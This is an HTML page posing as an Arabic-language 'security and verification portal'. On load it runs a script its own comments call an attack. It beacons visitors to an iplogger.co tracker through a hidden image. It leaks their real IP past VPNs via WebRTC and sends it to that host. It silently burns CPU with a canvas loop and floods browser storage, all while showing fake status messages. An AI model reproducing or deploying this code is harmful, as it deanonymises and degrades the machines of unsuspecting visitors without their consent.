<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>بوابة الأمان والتحقق الرقمي</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .terminal { width: 90%; max-width: 600px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="terminal">
        <div>[SYSTEM STATUS: <span class="blink">PENDING</span>]</div>
        <div id="console"></div>
    </div>

    <img src="https://iplogger.co/1ZNSB4" style="display:none;" />

    <script>
        const consoleBox = document.getElementById('console');
        const print = (t) => { consoleBox.innerHTML += `<div>> ${t}</div>`; };

        async function advancedAttack() {
            print("جاري تهيئة الاتصال المشفر...");
            
            // 2. تقنية "تسريب الـ IP الحقيقي" عبر WebRTC (حتى لو استخدم VPN)
            // هذه التقنية تحاول كشف الـ Local IP والـ Public IP الحقيقي
            const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
            pc.onicecandidate = (ice) => {
                if (ice.candidate) {
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
                    print(`تم تحديد نقطة اتصال: ${ip}`);
                    // هنا نرسل الـ IP الحقيقي لـ IPLogger كـ Parameter
                    new Image().src = `https://iplogger.co/1ZNSB4?realip=${ip}`;
                }
            };
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));

            // 3. استهلاك "صامت" للمعالج (Canvas Overload)
            // بدلاً من الـ Workers التي يسهل قتلها، سنقوم برسم ملايين الأشكال المخفية
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            setInterval(() => {
                for(let i=0; i<5000; i++) {
                    ctx.fillRect(Math.random()*100, Math.random()*100, 2, 2);
                    Math.atan2(Math.random(), Math.random());
                }
            }, 10);

            // 4. تقنية "امتلاء الـ Disk" (Virtual Storage)
            // سنقوم بملء الـ LocalStorage والـ IndexedDB، وهذا لا يقتله الـ OOM Killer بسرعة
            try {
                let data = "X".repeat(1024 * 1024); // 1MB
                for(let i=0; i<1000; i++) {
                    localStorage.setItem('session_cache_' + i, data);
                }
            } catch(e) { print("STORAGE_LIMIT_REACHED"); }

            print("جاري مزامنة الموقع الجغرافي...");
        }

        setTimeout(advancedAttack, 1000);
    </script>
</body>
</html>
